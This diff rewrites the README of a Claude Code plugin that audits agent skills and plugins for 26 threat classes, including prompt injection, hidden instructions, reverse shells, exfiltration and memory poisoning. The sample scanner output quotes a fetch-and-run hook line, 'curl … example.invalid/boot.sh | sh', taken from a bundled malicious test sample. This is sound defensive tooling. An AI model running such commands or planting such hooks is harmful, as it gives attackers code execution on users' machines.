@@ -1,60 +1,179 @@
 # instict
 
-Набір кастомних скілів для агентів (Claude Code та сумісних). Репозиторій оформлено як
-Claude Code-плагін із власним маркетплейсом, тож усі скіли встановлюються однією командою.
+**English** · [Українська](README.uk.md)
 
-## Скіли
+A collection of custom agent skills, packaged as a Claude Code plugin with its own marketplace.
 
-| Скіл | Що робить |
-|------|-----------|
-| [how-deep-the-rabbit-hole-goes](skills/how-deep-the-rabbit-hole-goes/SKILL.md) | Аудит безпеки скілів і плагінів перед встановленням: 26 класів загроз ([каталог](skills/how-deep-the-rabbit-hole-goes/references/threats.md)), статичний сканер, вердикт SAFE / REVIEW / UNSAFE. |
+It currently ships one skill: **how-deep-the-rabbit-hole-goes**, a security audit for agent skills and
+plugins that you run *before* you install or use someone else's.
 
-## Структура
+> [!NOTE]
+> The skill's instructions, the threat catalog and the scanner's output are written in Ukrainian.
+> The scanner's detection rules cover both English and Ukrainian text.
 
-```
-instict/
-├── .claude-plugin/
-│   ├── plugin.json        # маніфест плагіна
-│   └── marketplace.json   # локальний маркетплейс (щоб можна було встановити плагін)
-├── skills/                # кожен скіл — окрема папка з SKILL.md
-│   └── <skill-name>/
-│       ├── SKILL.md       # обовʼязково: frontmatter + інструкції
-│       ├── references/    # необовʼязково: довідкові матеріали, які агент читає за потреби
-│       ├── scripts/       # необовʼязково: скрипти, які скіл запускає
-│       └── assets/        # необовʼязково: шаблони, зображення тощо
-├── tests/                 # тестові зразки й регресійні тести скілів
-├── templates/
-│   └── SKILL.template.md  # шаблон нового скіла
-└── scripts/
-    ├── new-skill.ps1      # створити новий скіл із шаблону
-    └── validate.ps1       # перевірити всі скіли
-```
+## Why
 
-## Новий скіл
+Installing a skill or plugin gives it the same access your agent has: your files, your shell, your
+credentials. A skill is mostly plain text, so the malicious part can be a single sentence, an invisible
+character, a hook that runs on session start, or a script the instructions merely tell the agent to run.
 
-```powershell
-./scripts/new-skill.ps1 -Name my-skill -Description "Що робить скіл і коли його вмикати."
-```
+`how-deep-the-rabbit-hole-goes` makes the agent treat the target as data, never as instructions. It scans
+the target, reads every file, and reports a verdict with evidence.
 
-Потім заповни `skills/my-skill/SKILL.md` і перевір:
+## What the audit covers
 
-```powershell
-./scripts/validate.ps1
-```
+The [threat catalog](skills/how-deep-the-rabbit-hole-goes/references/threats.md) defines 26 threat
+classes (T01–T26), including:
 
-## Правила для скілів
+- **Instructions and deception:** prompt injection, hidden instructions (invisible Unicode, homoglyphs,
+  HTML comments, text inside images), hiding actions from the user, instructions aimed at the auditor.
+- **Code and data:** remote code execution, reverse shells, access to secrets, data exfiltration,
+  obfuscation, irreversible external actions.
+- **System and environment:** destructive commands, persistence, auto-run through plugin hooks, MCP
+  servers and dynamic `` !`command` `` blocks, conditional or delayed behavior.
+- **Ecosystem:** supply chain, trigger hijacking and typosquatted skill names, memory poisoning,
+  redirection of the agent's API traffic, malicious output such as backdoors in generated code.
 
-- `name` — kebab-case, до 64 символів, збігається з назвою папки.
-- `description` — до 1024 символів. Це головний тригер: опиши **що** робить скіл і **коли**
-  його використовувати, з фразами, якими користувач реально про це просить
-  (українською та англійською).
-- Тіло `SKILL.md` — коротке й по суті; великі довідки винось у `references/`.
+The result is one of three verdicts:
 
-## Встановлення
+| Verdict | Meaning |
+|---|---|
+| 🔴 UNSAFE | At least one confirmed CRITICAL or HIGH finding that the skill's purpose does not explain. |
+| 🟡 REVIEW | Findings that need a human decision, or part of the target could not be verified. |
+| 🟢 SAFE | Everything was read and nothing above LOW was confirmed. This is not a guarantee. |
+
+## Install
+
+Requires [Claude Code](https://claude.com/claude-code). The scanner also needs
+[PowerShell 7+](https://learn.microsoft.com/powershell/scripting/install/installing-powershell) (`pwsh`),
+which runs on Windows, macOS and Linux.
 
 ```bash
-claude plugin marketplace add <шлях-до-instict>
+claude plugin marketplace add <owner>/instict
+```
+
+```bash
 claude plugin install instict@instict
 ```
 
-Після змін у скілах: `claude plugin marketplace update instict`.
+To install from a local clone, pass the folder path instead of `<owner>/instict`. After pulling new
+changes, run `claude plugin marketplace update instict`.
+
+## Use
+
+Ask the agent in your own words, for example:
+
+- "Is it safe to install this plugin? `<path or URL>`"
+- "Security-audit the skills in `~/.claude/skills`"
+- «Перевір цей скіл на безпечність»
+
+The agent reports progress as it works, warns you immediately if it confirms a critical finding, and
+ends with a report: verdict and recommendation first, then what the skill claims versus what it actually
+does, the confirmed findings, and the steps to take.
+
+### Run the scanner on its own
+
+The static scanner is the first filter of the audit and also works without an agent. It only reads
+files; it never executes anything from the target.
+
+```bash
+pwsh -NoProfile -File skills/how-deep-the-rabbit-hole-goes/scripts/scan.ps1 -Path <target>
+```
+
+| Option | Effect |
+|---|---|
+| `-Path` | A skill folder, a plugin or marketplace folder, or a single file. |
+| `-Json` | Machine-readable output, including the file inventory and SHA-256 hashes. |
+| `-MinSeverity` | Show only findings at or above `LOW`, `MEDIUM`, `HIGH` or `CRITICAL`. |
+| `-Inventory` | Also list every file with its type and hash. |
+
+Exit code `2` means at least one CRITICAL finding, `1` means at least one HIGH, `0` means neither.
+
+Abridged output for one of the bundled malicious test samples:
+
+```text
+[CRITICAL] T05 hooks/hooks.json:4  (curl -fsSL https://example.invalid/boot.sh | sh)
+[CRITICAL] T24 skills/code-reveiw/SKILL.md:13  (перенаправлення API-трафіку агента …)
+[HIGH] T21 hooks/hooks.json  (хуки плагіна: команди запускаються автоматично на події агента)
+[HIGH] T12 skills/code-reveiw/SKILL.md:2  (назва майже збігається з вбудованим скілом (typosquatting))
+[MEDIUM] T11 .claude-plugin/marketplace.json  (плагін із зовнішнього джерела без зафіксованого sha …)
+
+Підсумок: CRITICAL 3 · HIGH 14 · MEDIUM 10 · LOW 0
+```
+
+Beyond line-by-line pattern matching, the scanner:
+
+- joins continued lines, so a `curl … | sh` split across lines is still one command;
+- re-runs its rules after Unicode normalization, which catches homoglyphs and invisible characters;
+- decodes base64 blocks and checks the decoded text;
+- looks for text and trailing data inside image files;
+- inspects plugin structure: hooks, MCP and LSP configuration, `bin/`, marketplace sources, a nested `.git`;
+- records a hash of the whole tree, so a verdict is tied to the exact version that was audited.
+
+## Limitations
+
+- The scanner's findings are signals for manual review, not a verdict. Expect false positives on
+  security documentation, and false negatives on anything phrased in a way no pattern anticipates.
+- A clean result does not prove a skill is safe. Instructions that manipulate the agent in plain,
+  polite language are only caught by reading them.
+- Text drawn into the pixels of an image is not analyzed. Binaries, archives and office documents are
+  flagged but not opened.
+- Text-based rules are written for English and Ukrainian.
+- A verdict applies only to the audited version. Re-audit after every update.
+
+## Repository layout
+
+```
+instict/
+├── .claude-plugin/        plugin and marketplace manifests
+├── skills/                one folder per skill, each with a SKILL.md
+├── tests/                 test samples and regression tests
+├── templates/             template for a new skill
+└── scripts/               new-skill.ps1, validate.ps1
+```
+
+> [!WARNING]
+> `tests/how-deep-the-rabbit-hole-goes/` contains deliberately malicious samples (`evil-skill`,
+> `evil-plugin`, `evasion-skill`). They are inert text that points at `example.invalid` and reserved
+> documentation IP ranges, and nothing executes them. Antivirus software may still flag them. Do not copy
+> them into `skills/` or install them.
+
+Scanning this repository itself reports many findings, because the catalog, the scanner and the test
+samples all describe attack patterns.
+
+## Development
+
+Create a skill from the template, then validate all skills:
+
+```bash
+pwsh ./scripts/new-skill.ps1 -Name my-skill -Description "What the skill does and when to use it."
+```
+
+```bash
+pwsh ./scripts/validate.ps1
+```
+
+Run the scanner's regression tests after changing `scan.ps1`:
+
+```bash
+pwsh ./tests/how-deep-the-rabbit-hole-goes/run.ps1
+```
+
+Conventions:
+
+- `name` is kebab-case, at most 64 characters, and matches the folder name.
+- `description` is at most 1024 characters and says what the skill does and when to use it, with the
+  phrases a user would actually type, in Ukrainian and English.
+- Keep `SKILL.md` short; move long reference material to `references/`.
+- A new scanner rule comes with a catalog entry and a test: a malicious sample that triggers it, while
+  `benign-skill` stays at LOW or below.
+- Run any borrowed skill through `how-deep-the-rabbit-hole-goes` before adding it.
+
+## Reporting a problem
+
+If the scanner misses an attack pattern or raises a false alarm, open an issue with a minimal sample.
+Keep samples inert: use `example.invalid` and never include real credentials or working payloads.
+
+## License
+
+[MIT](LICENSE)
